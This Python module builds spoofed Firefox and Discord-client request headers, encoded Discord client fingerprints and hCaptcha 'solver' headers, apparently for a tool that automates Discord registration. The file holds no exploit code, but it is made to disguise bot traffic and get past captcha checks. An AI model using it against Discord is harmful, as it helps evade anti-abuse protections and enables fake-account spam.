import json, base64, toml

__config__ = toml.loads(open('../config/config.toml', 'r+').read())

class Firefox:
    @staticmethod
    def base_header():
        return {
            'Host': 'discord.com',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0',
            'Accept': '*/*',
            'Accept-Language': 'fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3',
            'Accept-Encoding': 'gzip, deflate, br',
            'Content-Type': 'application/json',
            'Origin': 'https://discord.com',
            'DNT': '1',
            'Alt-Used': 'discord.com',
            'Connection': 'keep-alive',
            'Referer': 'https://discord.com/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'TE': 'trailers',
        }
    
    @staticmethod
    def super_properties(encoded: bool= True, is_xtrack: bool= True):
        payload = {
            "os": "Windows",
            "browser": "Firefox",
            "device": "",
            "system_locale": "fr",
            "browser_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
            "browser_version": "102.0",
            "os_version": "10",
            "referrer": "",
            "referring_domain": "",
            "referrer_current": "",
            "referring_domain_current": "",
            "release_channel": "stable",
            "client_build_number": 9999 if is_xtrack else __config__['discord']['build_number'],
            "client_event_source": None
        }

        return base64.b64encode(json.dumps(payload, separators=(',', ':')).encode()).decode() if encoded else payload

    @staticmethod
    def solver_base_header():
        return {
            'Host': 'hcaptcha.com',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0',
            'Accept': 'application/json',
            'Accept-Language': 'fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3',
            'Accept-Encoding': 'gzip, deflate, br',
            'Content-Type': 'text/plain',
            'Origin': 'https://newassets.hcaptcha.com',
            'DNT': '1',
            'Alt-Used': 'hcaptcha.com',
            'Connection': 'keep-alive',
            'Referer': 'https://newassets.hcaptcha.com/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-site',
            'Content-Length': '0',
            'TE': 'trailers',
        }

class Chrome:
    @staticmethod
    def base_header():
        return {
            'accept': '*/*',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'fr,fr-FR;q=0.9',
            'content-type': 'application/json',
            'origin': 'https://discord.com',
            'referer': 'https://discord.com/register',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9005 Chrome/91.0.4472.164 Electron/13.6.6 Safari/537.36',
            'x-debug-options': 'bugReporterEnabled',
            'x-discord-locale': 'en-US',
        }
    
    @staticmethod
    def super_properties(encoded: bool= True, is_xtrack: bool= True):
        payload = {
            "os": "Windows",
            "browser": "Discord Client",
            "release_channel": "stable",
            "client_version": "1.0.9005",
            "os_version": "10.0.19044",
            "os_arch": "x64",
            "system_locale": "fr",
            "client_build_number": 9999 if is_xtrack else __config__['discord']['build_number'],
            "client_event_source": None
        }

        return base64.b64encode(json.dumps(payload, separators=(',', ':')).encode()).decode() if encoded else payload

    @staticmethod
    def solver_base_header():
        return {
            'Host': 'hcaptcha.com',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9005 Chrome/91.0.4472.164 Electron/13.6.6 Safari/537.36',
            'Accept': 'application/json',
            'Accept-Language': 'fr',
            'Accept-Encoding': 'gzip, deflate, br',
            'Content-Type': 'text/plain',
            'Origin': 'https://newassets.hcaptcha.com',
            'DNT': '1',
            'Alt-Used': 'hcaptcha.com',
            'Connection': 'keep-alive',
            'Referer': 'https://newassets.hcaptcha.com/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-site',
            'Content-Length': '0',
            'TE': 'trailers',
        }
